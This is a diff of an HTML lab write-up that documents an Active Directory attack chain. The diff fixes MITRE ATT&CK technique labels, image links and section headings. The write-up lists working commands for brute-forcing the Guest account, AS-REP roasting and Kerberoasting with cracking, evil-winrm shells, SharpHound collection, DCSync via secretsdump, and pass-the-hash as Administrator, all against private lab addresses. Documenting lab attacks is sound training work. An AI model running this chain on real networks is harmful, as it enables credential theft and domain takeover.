@@ -617,9 +617,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#upload-and-execution-of-sharphound" class="md-nav__link">
+  <a href="#upload-of-sharphound" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload and Execution of SharpHound
+      Upload of SharpHound
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-of-sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution of SharpHound
     </span>
   </a>
   
@@ -644,9 +653,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#kerberoast-of-service-account" class="md-nav__link">
+  <a href="#kerberoast-of-svc-test" class="md-nav__link">
     <span class="md-ellipsis">
-      Kerberoast of Service Account
+      Kerberoast of svc-test
     </span>
   </a>
   
@@ -785,9 +794,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#upload-and-execution-of-sharphound" class="md-nav__link">
+  <a href="#upload-of-sharphound" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload and Execution of SharpHound
+      Upload of SharpHound
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-of-sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution of SharpHound
     </span>
   </a>
   
@@ -812,9 +830,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#kerberoast-of-service-account" class="md-nav__link">
+  <a href="#kerberoast-of-svc-test" class="md-nav__link">
     <span class="md-ellipsis">
-      Kerberoast of Service Account
+      Kerberoast of svc-test
     </span>
   </a>
   
@@ -858,62 +876,60 @@
 <p>Passwords and hashes have been concealed to retain confidentiality.</p>
 <h2 id="brute-forcing-guest-account"><u>Brute Forcing Guest Account</u><a class="headerlink" href="#brute-forcing-guest-account" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1110.001 (Brute Force: Password Guessing)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</code>
 <a class="glightbox" href="img/1.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="img/1.png" /></a></p>
 <h2 id="enumerating-smb-shares"><u>Enumerating SMB Shares</u><a class="headerlink" href="#enumerating-smb-shares" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1135 (Network Share Discovery)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>nxc smb 192.168.25.141 -u 'Guest' -p '_________' --shares</code>
-<a class="glightbox" href="img/3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="2" loading="lazy" src="img/3.png" /></a></p>
+<a class="glightbox" href="img/2.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="2" loading="lazy" src="img/2.png" /></a></p>
 <h2 id="asreproast-domain-account"><u>ASReproast Domain Account</u><a class="headerlink" href="#asreproast-domain-account" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting), T1110.002 (Brute Force: Password Cracking)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '' --asreproast asreproast.txt</code>
-<a class="glightbox" href="img/4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="3" loading="lazy" src="img/4.png" /></a>
-<code>john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt</code>
-<a class="glightbox" href="img/5.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="4" loading="lazy" src="img/5.png" /></a></p>
+<a class="glightbox" href="img/3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="3" loading="lazy" src="img/3.png" /></a></p>
+<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt</code>
+<a class="glightbox" href="img/4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="4" loading="lazy" src="img/4.png" /></a></p>
 <h2 id="winrm-shell-with-domain-account"><u>WinRM Shell with Domain Account</u><a class="headerlink" href="#winrm-shell-with-domain-account" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>nxc winrm 192.168.25.137 -u 'Bob' -p '_________’</code>
-<a class="glightbox" href="img/6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="5" loading="lazy" src="img/6.png" /></a>
-<code>evil-winrm -i 192.168.25.137 -u 'bob' -p '_________’</code>
-<a class="glightbox" href="img/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="6" loading="lazy" src="img/7.png" /></a></p>
-<h2 id="upload-and-execution-of-sharphound"><u>Upload and Execution of SharpHound</u><a class="headerlink" href="#upload-and-execution-of-sharphound" title="Permanent link">&para;</a></h2>
+<p><code>evil-winrm -i 192.168.25.137 -u 'bob' -p '_________’</code>
+<a class="glightbox" href="img/6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="5" loading="lazy" src="img/6.png" /></a></p>
+<h2 id="upload-of-sharphound"><u>Upload of SharpHound</u><a class="headerlink" href="#upload-of-sharphound" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1021.006 (Remote Services: Windows Remote Management), T1059.003 (Command and Scripting Interpreter: Windows Command Shell)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>upload SharpHound.exe</code>
-<a class="glightbox" href="img/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="img/7.png" /></a>
-<code>./SharpHound.exe</code>
+<a class="glightbox" href="img/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="img/7.png" /></a></p>
+<h2 id="execution-of-sharphound"><u>Execution of SharpHound</u><a class="headerlink" href="#execution-of-sharphound" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Techniques:</strong> T1069.002 (Permission Group Discovery: Domain Groups), T1087.002 (Account Discovery), T1018 (Remote System Discovery), T1482 (Domain Trust Discovery), T1560 (Archive Collected Data)</li>
+<li><strong>Procedure:</strong></li>
+</ul>
+<p><code>./SharpHound.exe</code>
 <a class="glightbox" href="img/8.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="8" loading="lazy" src="img/8.png" /></a></p>
 <h2 id="exfiltration-of-data-collected-by-sharphound"><u>Exfiltration of Data Collected by SharpHound</u><a class="headerlink" href="#exfiltration-of-data-collected-by-sharphound" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1041 (Exfiltration Over C2 Channel)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>download 20250910173643_BloodHound.zip</code>
 <a class="glightbox" href="img/10.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="10" loading="lazy" src="img/10.png" /></a></p>
 <h2 id="bloodhound"><u>Bloodhound</u><a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h2>
+<p><a class="glightbox" href="img/11.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="11" loading="lazy" src="img/11.png" /></a></p>
+<h2 id="kerberoast-of-svc-test"><u>Kerberoast of svc-test</u><a class="headerlink" href="#kerberoast-of-svc-test" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
-<li><strong>Procedure:</strong></li>
-</ul>
-<p><code>download 20250910173643_BloodHound.zip</code>
-<a class="glightbox" href="img/11.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="11" loading="lazy" src="img/11.png" /></a></p>
-<h2 id="kerberoast-of-service-account"><u>Kerberoast of Service Account</u><a class="headerlink" href="#kerberoast-of-service-account" title="Permanent link">&para;</a></h2>
-<ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1110.002 (Brute Force: Password Cracking), T1078.002 (Valid Accounts: Domain Accounts)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt</code>
@@ -922,14 +938,14 @@
 <a class="glightbox" href="img/13.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="13" loading="lazy" src="img/13.png" /></a></p>
 <h2 id="dcsync"><u>DCSync</u><a class="headerlink" href="#dcsync" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1003.006 (OS Credential Dumping: DCSync), T1078.002 (Valid Accounts: Domain Accounts)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local</code>
 <a class="glightbox" href="img/14.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="14" loading="lazy" src="img/14.png" /></a></p>
 <h2 id="pass-the-hash-to-login-as-domain-admin"><u>Pass-the-hash to Login as Domain Admin</u><a class="headerlink" href="#pass-the-hash-to-login-as-domain-admin" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.002 (SMB), T1003 (Credential Dumping)</li>
+<li><strong>Techniques:</strong> T1550.002 (Use Alternate Authentication Material: Pass the Hash), T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
 <p><code>evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________’</code>
